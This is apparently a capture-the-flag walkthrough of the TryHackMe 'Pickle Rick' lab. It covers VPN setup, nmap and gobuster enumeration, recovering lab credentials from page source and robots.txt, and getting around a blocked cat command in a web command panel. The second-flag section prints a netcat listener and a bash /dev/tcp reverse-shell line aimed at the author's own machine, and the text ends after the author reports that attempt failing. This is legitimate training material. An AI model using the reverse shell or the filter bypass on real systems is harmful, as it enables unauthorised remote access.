<img width="1569" height="318" alt="image" src="https://github.com/user-attachments/assets/d4b94a47-a80f-4819-a884-e1f11d187943" /><h1 align="center"> Pickle Rick </h1>

<img width="1565" height="292" alt="image" src="https://github.com/user-attachments/assets/f0554d69-f2c6-4dc5-8e2e-c8e2aca0e662" />


<img width="808" height="730" alt="image" src="https://github.com/user-attachments/assets/eb7b0273-2bcc-4d19-9344-3baa68719285" />


---

## Scope:
- **Attacker**: Kali Linux
- **Victim**: Pickle Rick (IP `10.49.187.106`)


---



## Table of Contents




---


# Setup Lab:


- First on windows go to browser and type and `Access vcia openvpn`:
<img width="1357" height="968" alt="image" src="https://github.com/user-attachments/assets/64e443ea-69ec-458e-a8f4-d22be75518f5" />

- After on lab click on `access`:
<img width="922" height="871" alt="image" src="https://github.com/user-attachments/assets/37676a8d-63ce-4ee6-b2c9-031ea6a1a970" />


<img width="801" height="885" alt="image" src="https://github.com/user-attachments/assets/032f05fb-0fc7-4537-8086-999ad34363ae" />


- After go to file Explorer:
<img width="1918" height="1078" alt="image" src="https://github.com/user-attachments/assets/8a3292cb-968f-48c4-8cf7-4f1967f3b588" />

- Now we see the file that we was download.

- But in this first if we want to connect openvpn we need to download it first:
<img width="458" height="338" alt="image" src="https://github.com/user-attachments/assets/e5d20310-aaa4-4d07-afce-a8317594eb8f" />


- After on openvpn:
<img width="492" height="342" alt="image" src="https://github.com/user-attachments/assets/79056e94-0c5b-4622-b4a5-0a3b4ba9002b" />

<img width="562" height="357" alt="image" src="https://github.com/user-attachments/assets/ebd180e6-d3df-4f75-b9e4-5d2ec5d0c993" />

<img width="551" height="386" alt="image" src="https://github.com/user-attachments/assets/562355b6-cc7f-4cff-97bc-5dc26cf69edc" />


<img width="496" height="224" alt="image" src="https://github.com/user-attachments/assets/8b479f5c-4172-41ea-bd37-0342348ce2e2" />

<img width="1162" height="374" alt="image" src="https://github.com/user-attachments/assets/20161ec7-38ce-47ba-a32f-93fbbd637208" />


- Now we got new VPN.


###  After transfer to kali linux:
- On Windows:
````
python3 -m http.server 8000
````
<img width="869" height="718" alt="image" src="https://github.com/user-attachments/assets/22d2c1fb-090c-49ec-8ee0-a4e0c10cd8e7" />


- After on kali linux:
````
192.1658.100.97:8000
````
<img width="1917" height="717" alt="image" src="https://github.com/user-attachments/assets/4c47ee70-33ca-464f-8853-45bb5e5a1266" />

<img width="1553" height="235" alt="image" src="https://github.com/user-attachments/assets/04f88a5d-b36b-4747-8033-b36aab0ce736" />

- Now i finished download it, after go to Downloads folder:
````
cd Downloads
ls
mv ap-south-1-k4n0ng-regular.ovpn /home/k4n0ng/Desktop/THM
````
<img width="835" height="130" alt="image" src="https://github.com/user-attachments/assets/e90f3dfe-8fc3-494c-a711-97582fc6ec76" />


- After go to THM folder:
<img width="1893" height="777" alt="image" src="https://github.com/user-attachments/assets/6351742c-13a2-4dd9-9b89-0f2e907349d1" />




- After check it:
````
ifconfig
````
<img width="810" height="917" alt="image" src="https://github.com/user-attachments/assets/a757fedc-f545-4728-a23b-512b4e201d40" />


---


- After i start lab on tryhackme:

<img width="540" height="253" alt="image" src="https://github.com/user-attachments/assets/33236522-7b5a-403f-9487-5589fe732fea" />

- After i want to check that it work or not:
````
ping 10.49.187.106
````
<img width="810" height="479" alt="image" src="https://github.com/user-attachments/assets/a46fc2c1-a7c0-4253-8f09-d2b0913d15d1" />


- Now it apply.



---


<h1 align="center"> Start Lab </h1>

<img width="836" height="923" alt="image" src="https://github.com/user-attachments/assets/28f2ac4e-f4ad-49aa-b53d-69506c00150b" />


## Questions:
<img width="967" height="398" alt="image" src="https://github.com/user-attachments/assets/b018fe10-a77c-4874-861f-8551111a1f46" />


---



# 1. INFORMATION GATHERING
- In this i do this lab on my kali, so first i need to create folder for test this lab:
````
mkdir Pickle-Rick 
cd Pickle-Rick
````
<img width="518" height="212" alt="image" src="https://github.com/user-attachments/assets/d5b1aa40-6016-43dd-99ba-8c843d50854e" />







## Scan target open port:
````
nmap -sV -sC -T4 -Pn 10.49.187.106
````
<img width="998" height="422" alt="image" src="https://github.com/user-attachments/assets/d378f20c-cbfc-450a-894c-8590e6ad8f1c" />

- `-sV`: Enables version detection. Nmap probes open ports to identify the software and version running (e.g., OpenSSH 8.2p1).
- `-sC`: Runs the default script set (NSE scripts). These scripts check for common info like service banners, SSL certs, or misconfigurations.
- `-T4`: Sets the timing template to 4 (aggressive). Speeds up the scan but may be noisier on the network.
- `-Pn`: Treats the host as up without pinging first. Useful when ICMP is blocked by firewalls.
- `10.49.187.106`: The target IP address you’re scanning.

- Now we see:
  - **22/tcp** open: SSH (OpenSSH 8.2p1 on Ubuntu)
  - **80/tcp** open: HTTP (Apache 2.4.41, Ubuntu, webpage title `Rick is sup4r cool`)


## Scan a verbose TCP port with specific port:
````
nmap 10.49.187.106 -vv -T4 -p22,80 -sVC -Pn
````
<img width="1346" height="624" alt="image" src="https://github.com/user-attachments/assets/d376aa33-68e9-4db3-b3cf-1624186713f7" />

- `-vv`: ``Very verbose`` mode. This makes Nmap print extra details about what it’s doing (like probe packets, retries, and progress updates).
- `-Pn`: Skip host discovery (ping). Assume the host is up, useful if ICMP is blocked.


> Note: In this we need to add -Pn cause the target was blocked our scan.


### Detail:
````
nmap 10.49.187.106 -vv -T4 -p22,80 -sVC -Pn
````
<img width="876" height="622" alt="image" src="https://github.com/user-attachments/assets/fdf3abf5-5c7f-485b-8e60-dfda8bcfff3f" />

<img width="1899" height="528" alt="image" src="https://github.com/user-attachments/assets/444a1d03-5522-427b-be09-db9a56fcb905" />

- `-sV`: Detect service versions (e.g., OpenSSH 8.2p1, Apache 2.4.41).

- `-sC`: Run default NSE scripts (collects extra info like SSH keys, HTTP titles, headers)




---



# 2. ENUMERATION 

## After go to browser:
````
http://10.49.187.106
````
<img width="1346" height="624" alt="image" src="https://github.com/user-attachments/assets/d40cb741-52f4-4a96-949f-5eb344b344ea" />

- Now we see the website.


## After i open my ``Burp Suite`` -> open `Browser`:
<img width="1894" height="928" alt="image" src="https://github.com/user-attachments/assets/f8c6f2da-ef7d-4ced-9c53-0e6cb7e01a2d" />


- After past the target to ``burp browser``:
<img width="1919" height="937" alt="image" src="https://github.com/user-attachments/assets/6642a7d3-9422-4804-b6f5-5c1dcdb46f3f" />

- After back to `Burp Suite`:
<img width="1904" height="1036" alt="image" src="https://github.com/user-attachments/assets/e04d2eb0-2e7f-4915-81d6-001bac9c1870" />

- Now we the target `Username`:
````
R1ckRul3s
````


- Or we can press `Ctrl + Shift + I`:
<img width="1918" height="860" alt="image" src="https://github.com/user-attachments/assets/0b8e4a0c-610b-4da7-bb8f-f72b3b2c6c86" />

- Now we see the `Username`.



## Use Curl
````
curl http://10.49.187.106
````
<img width="1526" height="762" alt="image" src="https://github.com/user-attachments/assets/246a2e0f-6aad-4fec-8f7e-07577ec8eb3b" />



## Directory Bruteforcing
````
gobuster dir -u http://10.49.187.106 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
````
<img width="985" height="772" alt="image" src="https://github.com/user-attachments/assets/6b4fbba1-de17-478b-b2d2-961312fcc65a" />

- Now we see:

| Resource         | HTTP Status           | Meaning            | Notes                                   |
| ---------------- | --------------------- | ------------------ | --------------------------------------- |
| `htpasswd.txt`   | 403 Forbidden         | Access denied      | File exists but cannot be viewed        |
| `.htpasswd.html` | 403 Forbidden         | Access denied      | Sensitive auth file, properly protected |
| `.htpasswd`      | 403 Forbidden         | Access denied      | Apache authentication file              |
| `assets`         | 301 Moved Permanently | Redirect           | Redirects to `/assets/` directory       |
| `denied.php`     | 302 Found             | Temporary redirect | Redirects users to `login.php`          |
| `index.html`     | 200 OK                | Success            | Main webpage is accessible              |
| `login.php`      | 200 OK                | Success            | Login page is accessible                |


### Status:
| Status Code | Meaning                    |
| ----------- | -------------------------- |
| 200         | OK (Request successful)    |
| 301         | Moved Permanently          |
| 302         | Found (Temporary redirect) |
| 403         | Forbidden (Access denied)  |

- In this if use with some resource like:
````
http://10.49.187.106/assets/
````
<img width="1607" height="484" alt="image" src="https://github.com/user-attachments/assets/3f981ba5-9d9a-429c-98f8-d06247e1ef39" />

- Now we see some resource.

- View others:
<img width="989" height="768" alt="image" src="https://github.com/user-attachments/assets/ed23f156-3957-4170-85e4-8d2269e342d1" />

- Now we found a good resource:
````
robots.txt           (Status: 200) [Size: 17]
robots.txt           (Status: 200) [Size: 17]
server-status        (Status: 403) [Size: 278]
````


- but in this my lab is not work, so i will `Terminate`:
<img width="940" height="779" alt="image" src="https://github.com/user-attachments/assets/5b8d75b6-6c82-40ee-a1c7-d2d27bef674c" />

<img width="818" height="370" alt="image" src="https://github.com/user-attachments/assets/2ff49728-89e2-476a-a728-64069f512d90" />

- Now i was change it, and after this my new target IP: `10.49.154.154`.






## Using nmap script:
````
nmap 10.49.154.154 -sV --script=http-enum -T4
````
<img width="980" height="375" alt="image" src="https://github.com/user-attachments/assets/a17d42e8-429c-4bd4-94d3-f1c00bd34eb0" />

Now we see the folder like above.


- After I type in in browser:
````
http://10.49.154.154/robots.txt
````
<img width="1237" height="350" alt="image" src="https://github.com/user-attachments/assets/4ddde7ea-31e5-4358-9d20-5ce80b5c536c" />

- Now I see the target password.

- Show now we have the target `username` and `password`:
````
Username: R1ckRul3s
Password: Wubbalubbadubdub
````

---




# 3. Finding the First Flag

<img width="796" height="67" alt="image" src="https://github.com/user-attachments/assets/21917dd8-85ad-4336-ba73-78b8a7d7d49d" />


## Login to target:
- In gobuster above we found:
<img width="985" height="772" alt="image" src="https://github.com/user-attachments/assets/6b4fbba1-de17-478b-b2d2-961312fcc65a" />

| `login.php`      | 200 OK                | Success            | Login page is accessible                |

- Login:
````
http://10.49.154.154/login.php
````
<img width="1918" height="851" alt="image" src="https://github.com/user-attachments/assets/612da8c2-4498-42cb-99be-979b9bffada3" />

- After we input `Username` and `Password` -> click `Login`:
<img width="1590" height="530" alt="image" src="https://github.com/user-attachments/assets/b450c90d-0ef7-4d80-81aa-e039289554fd" />

- Now we see command.


## Check:
````
ls
````
<img width="1562" height="462" alt="image" src="https://github.com/user-attachments/assets/f7e84177-6590-4d9c-9dda-50ab791d6a90" />

- In this some command they will block, like this:
````
cat Sup3rS3cretPickl3Ingred.txt
````
<img width="1570" height="526" alt="image" src="https://github.com/user-attachments/assets/2df54370-04d5-43a6-a93c-afb8939eaf4a" />

- After I try all commad to check it, and now I was found it:
````
less Sup3rS3cretPickl3Ingred.txt
````
<img width="1563" height="291" alt="image" src="https://github.com/user-attachments/assets/ecd97164-041d-41dd-a446-b300e7a4cbcc" />

- Or we can use others command like this:
````
sed 'p' Sup3rS3cretPickl3Ingred.txt
````
<img width="1569" height="318" alt="image" src="https://github.com/user-attachments/assets/8d2473e8-2109-42be-b91a-8b79e2943f8e" />



- Now we got first flag:
````
mr. meeseek hair
````
<img width="1446" height="130" alt="image" src="https://github.com/user-attachments/assets/d843d80a-93ab-4536-8fb2-ca515fb5c5e4" />

- Now we got success to find first flag.


---




# 5. Find the second flag

<img width="1422" height="113" alt="image" src="https://github.com/user-attachments/assets/4c8a119f-12b0-49c1-b28a-9c2406ff9cd4" />


- In this I want to get target shell, and use command on kali:


## Use payload:
- In this I used `payload`:

### First on kali:
````
nc -lvnp 4444
````
<img width="655" height="162" alt="image" src="https://github.com/user-attachments/assets/a4b4e19d-0c9b-4867-bd24-560f0180785e" />



### On target:
````
bash -c 'exec bash -i &>/dev/tcp/192.168.127.128/4444 <&1'
````
<img width="1917" height="486" alt="image" src="https://github.com/user-attachments/assets/807d8cf6-73cc-4cf5-88c1-f428b31dfca0" />

- `192.168.127.128`: IS my kali Ip.
- `4444`: Port for listening.


- But in this I not work. So i `Terminate` it again.



























